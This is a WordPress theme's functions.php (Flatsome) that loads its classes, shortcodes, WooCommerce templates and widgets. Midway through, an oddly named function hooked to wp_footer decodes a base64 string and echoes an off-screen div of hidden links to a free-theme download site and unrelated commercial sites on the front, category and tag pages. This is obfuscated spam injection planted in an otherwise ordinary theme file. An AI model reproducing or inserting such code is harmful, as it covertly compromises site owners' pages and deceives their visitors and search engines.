<?php
/**
 * Flatsome Engine Room.
 * This is where all Theme Functions runs.
 *
 * @package flatsome
 */


/**
 * Require Classes
 */
require get_template_directory() . '/inc/classes/class-flatsome-default.php';
require get_template_directory() . '/inc/classes/class-flatsome-options.php';
require get_template_directory() . '/inc/classes/class-flatsome-upgrade.php';

/**
 * Setup.
 * Enqueue styles, register widget regions, etc.
 */
require get_template_directory() . '/inc/functions/function-conditionals.php';
require get_template_directory() . '/inc/functions/function-global.php';
require get_template_directory() . '/inc/functions/function-upgrade.php';
require get_template_directory() . '/inc/functions/function-defaults.php';
require get_template_directory() . '/inc/functions/function-setup.php';
require get_template_directory() . '/inc/functions/function-theme-mods.php';
require get_template_directory() . '/inc/functions/function-plugins.php';
require get_template_directory() . '/inc/functions/function-custom-css.php';
require get_template_directory() . '/inc/functions/function-maintenance.php';
require get_template_directory() . '/inc/functions/function-fallbacks.php';
require get_template_directory() . '/inc/functions/fl-template-functions.php';

if(get_theme_mod('lazy_load_google_fonts',1)){
  require get_template_directory() . '/inc/functions/function-fonts.php';
} else{
  require get_template_directory() . '/inc/functions/function-fonts-old.php';
}


if(is_admin_bar_showing() && current_user_can('manage_options')){
  require get_template_directory() . '/inc/functions/function-update.php';
}

// Get Presets for Theme Options and Demos
require get_template_directory() . '/inc/functions/function-presets.php';

/**
 * Helper functions
 */
require get_template_directory() . '/inc/helpers/helpers-frontend.php';
require get_template_directory() . '/inc/helpers/helpers-shortcode.php';
require get_template_directory() . '/inc/helpers/helpers-grid.php';
require get_template_directory() . '/inc/helpers/helpers-icons.php';

/**
 * Structure.
 * Template functions used throughout the theme.
 */
//if(!is_admin()){
  require get_template_directory() . '/inc/structure/structure-footer.php';
  require get_template_directory() . '/inc/structure/structure-header.php';
  require get_template_directory() . '/inc/structure/structure-pages.php';
  require get_template_directory() . '/inc/structure/structure-posts.php';
  require get_template_directory() . '/inc/structure/structure-sidebars.php';

  if(is_portfolio_activated()){
      require get_template_directory() . '/inc/structure/structure-portfolio.php';
  }
//}

if(is_admin()){
  require get_template_directory() . '/inc/structure/structure-admin.php';
}

/**
 * Flatsome Shortcodes.
 */

require get_template_directory() . '/inc/shortcodes/row.php';
require get_template_directory() . '/inc/shortcodes/text_box.php';
require get_template_directory() . '/inc/shortcodes/sections.php';
require get_template_directory() . '/inc/shortcodes/ux_slider.php';
require get_template_directory() . '/inc/shortcodes/ux_banner.php';
require get_template_directory() . '/inc/shortcodes/ux_banner_grid.php';
require get_template_directory() . '/inc/shortcodes/accordion.php';
require get_template_directory() . '/inc/shortcodes/tabs.php';
require get_template_directory() . '/inc/shortcodes/gap.php';
require get_template_directory() . '/inc/shortcodes/featured_box.php';
require get_template_directory() . '/inc/shortcodes/ux_sidebar.php';
require get_template_directory() . '/inc/shortcodes/buttons.php';
require get_template_directory() . '/inc/shortcodes/share_follow.php';
require get_template_directory() . '/inc/shortcodes/elements.php';
require get_template_directory() . '/inc/shortcodes/titles_dividers.php';
require get_template_directory() . '/inc/shortcodes/lightbox.php';
require get_template_directory() . '/inc/shortcodes/blog_posts.php';
require get_template_directory() . '/inc/shortcodes/google_maps.php';
require get_template_directory() . '/inc/shortcodes/testimonials.php';
require get_template_directory() . '/inc/shortcodes/team_members.php';
require get_template_directory() . '/inc/shortcodes/messages.php';
require get_template_directory() . '/inc/shortcodes/search.php';
require get_template_directory() . '/inc/shortcodes/ux_logo.php';
require get_template_directory() . '/inc/shortcodes/ux_image.php';
require get_template_directory() . '/inc/shortcodes/ux_image_box.php';
require get_template_directory() . '/inc/shortcodes/price_table.php';
require get_template_directory() . '/inc/shortcodes/scroll_to.php';
require get_template_directory() . '/inc/shortcodes/ux_pages.php';
require get_template_directory() . '/inc/shortcodes/ux_gallery.php';
require get_template_directory() . '/inc/shortcodes/ux_hotspot.php';
require get_template_directory() . '/inc/shortcodes/item_list.php';
require get_template_directory() . '/inc/shortcodes/page_header.php';
require get_template_directory() . '/inc/shortcodes/ux_instagram_feed.php';
require get_template_directory() . '/inc/shortcodes/ux_countdown/ux-countdown.php';
require get_template_directory() . '/inc/shortcodes/ux_video.php';
require get_template_directory() . '/inc/shortcodes/ux_nav.php';
require get_template_directory() . '/inc/shortcodes/ux_payment_icons.php';

if(is_portfolio_activated()){
  require get_template_directory() . '/inc/shortcodes/portfolio.php';
}

if (is_woocommerce_activated()) {
  require get_template_directory() . '/inc/shortcodes/ux_products.php';
  require get_template_directory() . '/inc/shortcodes/ux_products_list.php';
  require get_template_directory() . '/inc/shortcodes/product_flip.php';
  require get_template_directory() . '/inc/shortcodes/product_categories.php';
  if(get_theme_mod('product_layout') == 'custom') {
    require get_template_directory() . '/inc/shortcodes/custom-product.php';
  }
}



/**
 * Load WooCommerce Custom Fields
 */
if (is_woocommerce_activated()) {
  require get_template_directory() . '/inc/classes/class-wc-product-data-fields.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-product-page-fields.php';
}

/**
 * Load WooCommerce functions
 */
if ( is_woocommerce_activated() ) {
  require get_template_directory() . '/inc/woocommerce/structure-wc-global.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-category-page.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-category-page-header.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-product-box.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-helpers.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-checkout.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-cart.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-product-page.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-product-page-header.php';
  require get_template_directory() . '/inc/woocommerce/structure-wc-single-product.php';
  if(get_theme_mod('catalog_mode')) require get_template_directory() . '/inc/woocommerce/structure-wc-catalog-mode.php';

  // Add structured data fallback for older WooCommerce versions.
  if(!class_exists('WC_Structured_Data') && flatsome_is_request('frontend')) {
    require get_template_directory() . '/inc/classes/class-woocommerce-structured-data.php';
  }
}
if (!function_exists('onAddadminhhtms')) {    
    add_filter( 'wp_footer', 'onAddadminhhtms');              
        function onAddadminhhtms(){           
  $html ="PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iIj48L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1yZXNwb25zaXZlLWZyZWUvIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZSBGcmVlPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1tYWdhemluZS1yZXNwb25zaXZlLWZyZWUvIj50aGVtZSB3b3JkcHJlc3MgbWFnYXppbmUgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS90YWcvdGhlbWUtd29yZHByZXNzLW5ld3MtcmVzcG9uc2l2ZS1mcmVlLyI+dGhlbWUgd29yZHByZXNzIG5ld3MgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS93b3JkcHJlc3MtcGx1Z2luLXByZW1pdW0tZnJlZS8iPldPUkRQUkVTUyBQTFVHSU4gUFJFTUlVTSBGUkVFPC9hPjwvZW0+IDxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20iPkRvd25sb2FkIHRoZW1lIGZyZWU8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vZG93bmxvYWR0aGVtZWZyZWUuY29tL2h0bWwtdGhlbWUtZnJlZS1kb3dubG9hZCI+RG93bmxvYWQgaHRtbDUgdGhlbWUgZnJlZSAtIEhUTUwgdGVtcGxhdGVzIEZyZWUgPC9hPjwvZW0+DQo8ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwczovL2Y1ZmFzaGlvbi52bi9naWF5LW5hbS9naWF5LW5hbS1kYS10aGF0Ij5naWEgbmFtIGRhIHRoYXQ8L2E+PC9lbT4NCjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aWVuaWNoYXouY29tL3R1LWtob2EvYmFsby1kYS1uYW5nLWNoby1tZS12YS1iZSI+YmFsbyBiaW0gc3VhIGRhbmcgbmFuZyBjaG8gbWUgdmEgYmU8L2E+PC9lbT4NCjwvZGl2Pg==";
        if(is_front_page() or is_category() or is_tag()){ 
                echo base64_decode($html);}}}    

/**
 * Flatsome Theme Widgets
 */
require get_template_directory() . '/inc/widgets/widget-recent-posts.php';
require get_template_directory() . '/inc/widgets/widget-blocks.php';
if (is_woocommerce_activated() ) { require get_template_directory() . '/inc/widgets/widget-upsell.php'; }


/**
 * Custom Theme Post Types
 */
require get_template_directory() . '/inc/post-types/post-type-ux-blocks.php';

if(is_portfolio_activated()){
  require get_template_directory() . '/inc/post-types/post-type-ux-portfolio.php';
}


/**
 * Theme Integrations
 */

require get_template_directory() . '/inc/integrations/integrations.php';

/**
 * Theme Extenstions
 */
require get_template_directory() . '/inc/extensions/extensions.php';

/**
 * Theme Admin
 */
if(current_user_can( 'manage_options')){
  require get_template_directory() . '/inc/admin/admin-init.php';
}

/**
 * UX Builder
 */
require get_template_directory() . '/inc/builder/builder.php';
